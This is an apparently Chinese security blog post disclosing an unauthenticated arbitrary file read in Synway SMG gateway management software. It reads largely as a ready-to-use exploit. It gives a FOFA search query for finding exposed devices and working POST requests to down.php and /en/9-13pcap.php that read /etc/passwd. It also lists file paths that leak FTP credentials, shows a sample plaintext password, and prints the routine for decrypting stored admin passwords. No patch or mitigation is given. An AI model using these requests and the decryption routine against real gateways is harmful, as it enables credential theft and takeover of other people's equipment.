---
title: "三汇SMG 网关管理软件 down.php 任意文件读取漏洞"
source: https://mrxn.net/jswz/synway-down-fileread.html
asset_dir: assets/三汇smg-网关管理软件-down.php-任意文件读取漏洞
---

# 三汇SMG 网关管理软件 down.php 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/1 15:48
- 1551浏览
- [0评论](#comment)
- 41分钟阅读

深入探索

软件

身份验证

script

---

# 漏洞简介

三汇SMG 网关管理[软件](#)是与三汇SMG系列数字网关产品配套的管理工具，是杭州三汇信息工程有限公司开发的一款高效、稳定、易用的网关管理软件。它专为三汇SMG系列数字网关设计，提供了全面的配置、监控、管理和维护功能，帮助用户轻松实现网关设备的远程管理和优化。  
三汇SMG网关管理软件 `down.php` 接口存在[任意文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96 "任意文件读取漏洞")，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

物流软件安全

# 影响版本

# fofa语法

> `body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")`

# 漏洞分析

直接看 `down.php` 的业务实现逻辑

```
 if($_POST[down]!="")
 {
    $rst=download($_POST[downfile],0);
    if($rst == false)
    {
        echo "<script language=javascript>history.back();</script>";
    }
 }
```

POST 参数 `down` 不为空，则直接将 `downfile` 参数作为文件路径带入 `download` 函数中，其实现如下

漏洞扫描服务

深入探索

Web安全课程

SQL注入检测工具

漏洞预警服务

```
function download($file_path,$flag=1,$newFileName="")
{
    set_time_limit(0);
    if(!file_exists($file_path))
    {
        include_once("readini.php");
        $file = "../Config/SMGConfig.ini";
        $settings = new Settings_INI;
        $settings->load($file);
        $currLanguage1 = $settings->get("SysInfo.Language")==-1?1:$settings->get("SysInfo.Language");

        if ($currLanguage1 == 1)
            echo "<script language=javascript>alert('对不起,你要下载的文件不存在！');</script>";
        else
            echo "<script language=javascript>alert('Sorry, this file do not exist!');</script>";
        return false;
    }
    else
    {
        $file_size = filesize($file_path);
        $file_name=basename($file_path);
        header("Content-type: application/octet-stream");
        header("Accept-Ranges: bytes");
        header("Accept-Length: $file_size");
        if($newFileName == "")
            header("Content-Disposition: attachment; filename=".$file_name);
        else
            header("Content-Disposition: attachment; filename=".$newFileName);
        //echo fread($file_path,$file_size);

        $fp = fopen($file_path,"r");
        $buffer_size = 1024;
        $cur_pos = 0;
        ob_clean();
        while(!feof($fp)&&($file_size-$cur_pos)>$buffer_size)
        {
            $buffer = fread($fp,$buffer_size);
            echo $buffer;
            $cur_pos += $buffer_size;
        }

        $buffer = fread($fp,$file_size-$cur_pos);
        echo $buffer;
        fclose($fp);
        if($flag)
        {
            unlink($file_path);
        }
        exit();
    }
}
```

对传入进来的 `$file_path` 在判断存在后直接使用 `fopen` 函数读取文件内容输出，中间对文件路径无任何过滤，造成任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96 "文件读取漏洞")。

# 漏洞复现

```
POST /down.php HTTP/1.1
Host: synway.mrxn.net
Content-Type: application/x-www-form-urlencoded

down=1&downfile=/etc/passwd
```

[![三汇SMG 网关管理软件 down.php 任意文件读取漏洞](images/img-001-267c9e9f82ea.webp)](https://image.mrxn.net/bca075aac0064dc189fcaa09371a76f0.webp)

利用[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")成功读取到 /etc/passwd 文件内容。

软件

也可以读取 /usr/local/apache/htdocs/en/9-10snmp.php 或者 /usr/local/apache/htdocs/Config/ftplog 或者 /usr/local/apache/htdocs/ftplog 文件内容，其中一般包含 ftp 账户密码

```
ftpput -u root -p root13173137
ftpget: cmd (null) (null)
ftpget: cmd USER root
ftpget: cmd PASS root13173137
```

**/en/9-13pcap.php** 也存在同样的任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96 "文件读取漏洞")

```
POST /en/9-13pcap.php HTTP/1.1
Host: synway.mrxn.net
Content-Type: application/x-www-form-urlencoded

down=1&downfile=/etc/passwd
```

[![三汇SMG 网关管理软件 down.php 任意文件读取漏洞](images/img-002-ea46350f02d2.webp)](https://image.mrxn.net/9ec0444505ae41d29d1318a67587d297.webp)

读取 Config/ShIndex.ini 系统账户密码

网络安全

[![三汇SMG 网关管理软件 down.php 任意文件读取漏洞](images/img-003-4c7493bce3db.webp)](https://image.mrxn.net/9cc48277d3ee408e8837d8df3ab5b117.webp)

而账户密码加解密函数如下

```
function encrypt($string,$operation,$key='')
{
    $key=md5($key);
    $key_length=strlen($key);
    $string=$operation=='D'?base64_decode($string):substr(md5($string.$key),0,8).$string;
    $string_length=strlen($string);
    $rndkey=$box=array();
    $result='';
    for($i=0;$i<=255;$i++)
    {
        $rndkey[$i]=ord($key[$i%$key_length]);
        $box[$i]=$i;
    }
    for($j=$i=0;$i<256;$i++)
    {
        $j=($j+$box[$i]+$rndkey[$i])%256;
        $tmp=$box[$i];
        $box[$i]=$box[$j];
        $box[$j]=$tmp;
    }
    for($a=$j=$i=0;$i<$string_length;$i++)
    {
        $a=($a+1)%256;
        $j=($j+$box[$a])%256;
        $tmp=$box[$a];
        $box[$a]=$box[$j];
        $box[$j]=$tmp;
        $result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));
    }
    if($operation=='D')
    {
        $str1 = substr($result,0,8);
        $str2 = substr(md5(substr($result,8).$key),0,8);
        if (!strcmp($str1, $str2))
        {
            return substr($result,8);
        }
        else
        {
            return'';
        }
    }
    else
    {
        return str_replace('=','',base64_encode($result));
    }
}
```

很容易就可以解密出明文账户密码。进入后台 有更多的命令注入点。

数据管理

[![三汇SMG 网关管理软件 down.php 任意文件读取漏洞](images/img-004-6c4ca0683db7.webp)](https://image.mrxn.net/bf2f3bdc75a04f02ba613d46ff9f6913.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

代码安全审计
